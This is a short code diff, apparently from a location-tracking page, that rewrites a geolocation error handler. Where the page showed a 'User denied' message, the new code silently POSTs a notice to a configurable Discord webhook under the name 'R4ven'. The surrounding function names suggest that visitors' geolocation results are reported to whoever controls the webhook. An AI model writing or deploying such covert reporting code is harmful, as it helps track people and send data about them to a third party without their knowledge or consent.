@@ -107,7 +107,18 @@ function showPosition(position) {
 function showError(error) {
   switch(error.code) {
     case error.PERMISSION_DENIED:
-      x.innerHTML = "User denied the request for Geolocation."
+      const request = new XMLHttpRequest();
+      request.open("POST", discord.webhook); //change webhook
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "R4ven",
+        avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
+        content: "```diff\n- User denied the request for Geolocation.```"
+      }
+
+      request.send(JSON.stringify(params));
       break;
     case error.POSITION_UNAVAILABLE:
       x.innerHTML = "Location information is unavailable."
